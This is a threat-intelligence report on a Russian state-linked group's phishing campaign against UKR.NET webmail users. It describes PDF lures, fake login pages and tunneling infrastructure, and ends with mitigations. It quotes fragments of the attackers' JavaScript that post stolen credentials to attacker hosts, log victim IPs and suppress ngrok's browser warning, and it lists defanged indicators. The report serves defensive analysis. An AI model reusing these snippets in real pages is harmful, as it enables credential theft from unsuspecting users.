BlueDelta’s Persistent  
Campaign Against UKR.NET
BlueDelta continued targeting UKR. The group refined its phishing BlueDelta’s activity reflects GRU

chains. evade detection. conflict.



CYBER THREAT ANALYSIS 
 

The analysis cut-off date for this report was July 30, 2025 

Executive Summary 
Between June 2024 and April 2025, Recorded Future’s Insikt Group identified a sustained 
credential-harvesting campaign targeting users of UKR.NET, a widely used Ukrainian webmail and news 
service. The activity is attributed to the Russian state-sponsored threat group BlueDelta (also known as 
APT28, Fancy Bear, and Forest Blizzard). This campaign builds on BlueDelta’s earlier operations 
detailed in the May 2024 Insikt Group report “GRU’s BlueDelta Targets Key Networks in Europe with 
Multi-Phase Espionage Campaigns,” which documented GRU-linked credential theft and espionage 
activity. While this campaign does not reveal specific targets, BlueDelta’s historical focus on credential 
theft to enable intelligence collection provides strong indicators of likely intent to collect sensitive 
information from Ukrainian users in support of broader GRU intelligence requirements. 

Insikt Group observed BlueDelta deploy multiple credential-harvesting pages themed as UKR.NET login 
portals. The group leveraged free web services, including Mocky, DNS EXIT, and later, proxy tunneling 
platforms such as ngrok and Serveo, to collect usernames, passwords, and two-factor authentication 
codes. BlueDelta distributed PDF lures containing embedded links to these credential-harvesting pages, 
likely to bypass automated email scanning and sandbox detections. The tools, infrastructure choices, 
and bespoke JavaScript used in this report are consistent with BlueDelta’s established tradecraft and 
have not been observed in use by other Russian threat groups. 

BlueDelta’s continued abuse of free hosting and anonymized tunneling infrastructure likely reflects an 
adaptive response to Western-led infrastructure takedowns in early 2024. The campaign highlights the 
GRU’s persistent interest in compromising Ukrainian user credentials to support intelligence-gathering 
operations amid Russia’s ongoing war in Ukraine. 

Key Findings 
●​ BlueDelta maintained a consistent focus on UKR.NET users, continuing its long-running 

credential-harvesting activity throughout 2024 and 2025. 
●​ The group distributed malicious PDF lures that linked to credential-harvesting pages through 

embedded URLs, enabling it to evade common email filtering and sandbox detection techniques. 
●​ BlueDelta transitioned from compromised routers to proxy tunneling platforms, such as ngrok 

and Serveo, to relay credentials and bypass CAPTCHA and two-factor authentication challenges. 
●​ Activity between March and April 2025 revealed updates to BlueDelta’s multi-tier infrastructure, 

including new tier-three and previously unseen tier-four components, indicating increased 
operational layering and sophistication. 

●​ The campaign demonstrates continued refinement of BlueDelta’s credential-theft operations, 
reflecting the GRU’s sustained focus on collecting Ukrainian user credentials for intelligence 
purposes.

CYBER THREAT ANALYSIS 
 

Background 
BlueDelta is a Russian state-sponsored threat group associated with the Main Directorate of the General 
Staff of the Russian Federation’s Armed Forces (GRU). Also known as APT28, Fancy Bear, and Forest 
Blizzard, the group has conducted credential-harvesting and espionage operations for more than a 
decade. The activity detailed in this report aligns with previous BlueDelta campaigns tracked by Insikt 
Group and consistently attributed by multiple Western governments to the GRU. 
 
Since at least the mid-2000s, BlueDelta has conducted phishing and credential-theft operations against 
a wide range of targets, including government institutions, defense contractors, weapons suppliers, 
logistics firms, and policy think tanks. These efforts aim to collect credentials and intelligence relevant 
to Russia’s military operations and strategic interests. Previously reported activity focused on UKR.NET 
and other webmail services using fake login portals hosted on free web infrastructure and 
compromised routers to capture usernames, passwords, and authentication codes. 
 

Technical Analysis 
On June 14, 2024, Insikt Group identified a new BlueDelta credential harvesting page, themed as a 
UKR.NET login page, as shown in Figure 1. The page was hosted using the free API service Mocky, 
which BlueDelta used regularly for most of its credential harvesting pages throughout 2024.

CYBER THREAT ANALYSIS 
 
The malicious UKR.NET page had very similar functionality to that previously observed by Insikt Group. 
The page used JavaScript to exfiltrate credentials and relay CAPTCHA information to the domain and 
fixed a high port combination, kfghjerrlknsm[.]line[.]pm[:]11962, as per Figure 2.

ring.fromCharCode(39),String.fromCharCode(34)));next(); 
full.forEach(element=>setInp(element.value, element.id));}}}; 
req.open("POST", baseurl, true); 
req.setRequestHeader("task", task); 
req.setRequestHeader("sessionID", sessionID);

The line[.]pm apex domain is owned by the free hosting company DNS EXIT, which offers free 
subdomain hosting. 

At the time of analysis, the domain resolved to the IP address 18[.]157[.]68[.]73, which is an Amazon 
Elastic Compute Cloud (EC2) instance suspected of being used by the globally distributed reverse 
proxy service ngrok. ngrok offers a free service that enables users to connect servers behind a firewall 
to a proxy server and expose that server to the internet without changing firewall rules. In this instance, 
the service is likely being abused by BlueDelta to mask the true location of its upstream infrastructure. 

The use of ngrok represents a notable change in BlueDelta’s infrastructure, as the threat group 
previously used compromised Ubiquiti routers to host Python scripts that captured credentials and 
handled 2FA and CAPTCHA challenges. This change is likely a response to efforts by the Federal 
Bureau of Investigation (FBI), National Security Agency (NSA), US Cyber Command, and international 
partners to dismantle BlueDelta's infrastructure in early 2024. 

BlueDelta added new functionality to the page hosted on kfghjerrlknsm[.]line[.]pm to capture victim IP 
addresses using the free HTTP request and response API service HTTPBin, as shown in Figure 3. 

JavaScript
var respIP=$.getJSON('hxxps://httpbin[.]org/ip');

Two additional credential harvesting pages were discovered in July and September 2024 that matched 
the configuration of the first page but used different Mocky URLs, with one of the pages configured to 
use a different port number. This is likely due to BlueDelta setting up a new ngrok tunnel. 

On September 13, 2024, Insikt Group identified a new UKR.NET credential harvesting page, which was 
again hosted on Mocky. For this page, BlueDelta exfiltrated credentials and relayed CAPTCHA 
information to the domain 5ae39a1b39d45d08f947bdf0ee0452ae[.]serveo[.]net. 

The apex domain serveo[.]net is owned by Serveo, a company that offers free remote port forwarding 
services similar to ngrok. 

In October and November 2024, Insikt Group identified three new UKR.NET-themed credential 
harvesting pages. Again, these pages were hosted using Mocky and were constructed with similar

JavaScript to the previously reported pages. However, in the latest pages, BlueDelta moved upstream 
credential capture and relay functionality back to ngrok, using the custom DNS EXIT domain 
jkbfgkjdffghh[.]linkpc[.]net, configured with two separate fixed high ephemeral ports: 10176 and 17461. 
At the time of analysis, the linkpc[.]net domain resolved to suspected ngrok IP address 3[.]67[.]15[.]169. 

Additionally, BlueDelta added new first-stage redirection domains for two of the pages: 
ukraine[.]html-5[.]me and ukrainesafe[.]is-great[.]org. It is likely that the threat actors added this extra 
step to hide Mocky URLs in phishing emails. The apex domains html-5[.]me and is-great[.]org are 
owned by the free hosting company Byet Internet Services. 

On December 27, 2024, Insikt Group identified a new BlueDelta UKR.NET credential harvesting page 
hosted on the Mocky URL run[.]mocky[.]io/v3/72fa0a52-6e6e-43ad-b1c2-4782945d6050. The 
malicious UKR.NET page had very similar functionality to the previously detailed pages. The page used 
JavaScript to exfiltrate credentials and relay CAPTCHA information to the same DNS EXIT domain, with 
an updated fixed port, jkbfgkjdffghh[.]linkpc[.]net:17461, as shown in Figures 4 and 5.

During the analysis of this credential harvesting page, Insikt Group detected over twenty linked PDF 
files, which BlueDelta likely sent to victims as phishing lures. The PDF lure document, as shown in 
Figure 6, informs the target of suspicious activity on their UKR.NET account and requests that they click 
a link to reset their password.

(Source: Recorded Future) 

Each of the PDFs included a hyperlink to a credential harvesting page. Most of these links were either 
shortened using link-shortening services or used a domain registered through a free hosting provider. 
Since 2023, BlueDelta has used the following link-shortening platforms: 

●​ doads[.]org  
●​ in[.]run  
●​ t[.]ly  
●​ tiny[.]cc  
●​ tinyurl[.]com  
●​ linkcuts[.]com  

 
In addition to link-shortening services, BlueDelta has employed free domains from the hosting provider 
InfinityFree or from Byet Internet Services, or subdomains provided by the free blogging platform 
Blogger (formerly Blogspot) for tier-two link redirection, in conjunction with link-shortening services. 
The following apex domains have been used in BlueDelta campaigns since 2023:

BlueDelta’s infrastructure configuration remained predominantly static between December 2024 and 
April 2025, leveraging six separate steps in its credential harvesting setup, as shown in Figure 7. 

Figure 7: BlueDelta credential harvesting infrastructure configuration (Source: Recorded Future) 

For tier two, BlueDelta has continued to use the free API service Mocky to host all of its credential 
harvesting pages. The HTML and JavaScript in the latest pages remain very similar to those previously 
described, except for the addition of a new line of code (Figure 8), which is added in three places to 
existing JavaScript functions. 

JavaScript
req.setRequestHeader("ngrok-skip-browser-warning", "1"); 

Figure 8: The new line of code added to disable the ngrok browser warning (Source: Recorded Future) 

The additional line of JavaScript adds a new HTTP request header to all outgoing requests from the 
page to the ngrok service. This new header is used to disable ngrok's browser warning page, a safety 
feature that displays an in-browser warning when connections are directed through its proxy service. 
Without this additional header, BlueDelta’s targets would receive a warning when interacting with the 
page, which could alert them to its malicious nature. 
 
Between March 13 and April 17, 2025, BlueDelta updated its tier-three infrastructure. Instead of using 
DNS EXIT free domains that resolved to ngrok servers, the actors used ngrok v3’s free subdomains, as 
shown in Table 1.

Table 1: Ngrok’s free domains used by BlueDelta (Source: Recorded Future) 

For tier four, BlueDelta used dedicated servers. The first tier-four IP address 5[.]135[.]199[.]21, located 
in France, was active between February 1 and April 10, 2025. At the time it was active, the server had 
SSH open on TCP port 22 and a default nginx banner on TCP port 80. Additionally, it was running a 
custom HTTP server on TCP port 4430, which is likely the port used for connections from the ngrok 
tunnel. The TLS certificate hosted on this port used the common name jkbfgkjdffghh[.]linkpc[.]net, the 
same DNS EXIT domain observed on ngrok servers in the previous version of the infrastructure. 
 
Between April 18 and 22, 2025, the typosquat domain ukrinet[.]com resolved to IP address 
5[.]135[.]199[.]21. Although this is outside the date window highlighted by banner analysis, due to its 
proximity to UKR.NET, it is likely that this domain is related to BlueDelta’s activity.​
​
Additionally, between April 24 and 29, 2025, the domain ukrinet[.]com resolved to Swiss IP address 
179[.]43[.]141[.]80. On April 30, 2025, the same IP address hosted the domain ukrainnet[.]com, which 
has a close resemblance to UKR.NET and is therefore likely related to BlueDelta’s infrastructure. 
However, at the time of investigation, Insikt Group was unable to definitively identify any malicious 
activity related to this domain and ukrinet[.]com. 
 
The second tier-four IP address, 51[.]161[.]109[.]50, was located in Canada and was active between 
April 15 and May 15, 2025. At the time it was active, the server had SSH open on TCP port 22 and was 
running a custom HTTP server on TCP port 35780.

In total, Insikt Group was able to identify 42 new BlueDelta credential harvesting chains. 

Mitigations 
Organizations can mitigate risk from this campaign through the following actions: 
 

●​ Leverage Recorded Future® Threat Intelligence: 
○​ Customers can use Recorded Future’s continuously updated Risk Lists to identify and 

block known BlueDelta infrastructure 
○​ Enable alerting in the Recorded Future Intelligence Operations Platform for newly 

registered domains or IPs linked to Mocky, Byet Internet Services, ngrok, Serveo, and 
DNS EXIT 

○​ Use Recorded Future Identity Intelligence to monitor for leaked or reused credentials 
associated with corporate domains 
 

●​ Implement specific protective measures: 
○​ Enforce strong, unique passwords and enable multi-factor authentication (MFA), 

prioritizing phishing-resistant methods such as hardware or app-based authenticators 
○​ Deny-list free hosting and tunneling services not required for business operations, 

including Mocky, Byet, ngrok, Serveo, and DNS EXIT 
○​ Monitor email and web gateway logs for PDF attachments or embedded links referencing 

account verification, password resets, or login issues 
○​ Track authentication attempts from proxy services or nonstandard ports, particularly 

those associated with ngrok tunnels 
 

●​ Adopt general best practices: 
○​ Conduct regular phishing awareness training focused on fake login portals and 

security-themed lures 
○​ Maintain an incident response plan for credential compromise, including defined 

escalation procedures, account reset protocols, and containment measures 
○​ Periodically review external service dependencies to prevent unnecessary exposure to 

free or unvetted web services

CYBER THREAT ANALYSIS 
 

Outlook 
BlueDelta is likely to sustain credential-harvesting activity through 2025 and into 2026, continuing its 
reliance on low-cost and anonymous web infrastructure. The group has demonstrated adaptability by 
transitioning from compromised routers to proxy tunneling services such as ngrok and Serveo, a trend 
expected to continue as it seeks to obscure infrastructure and bypass detection during its campaigns. 
 
Future campaigns will likely incorporate further diversification of free hosting and redirection platforms 
to maintain operational continuity amid ongoing law enforcement and partner takedown efforts. The 
consistent use of PDF lures and embedded links suggests BlueDelta will continue refining delivery 
mechanisms designed to evade automated email defenses and exploit user trust in familiar brands. 
These operations highlight the persistence of GRU-linked credential theft as a cost-effective and 
scalable method for gaining initial access and collecting intelligence.
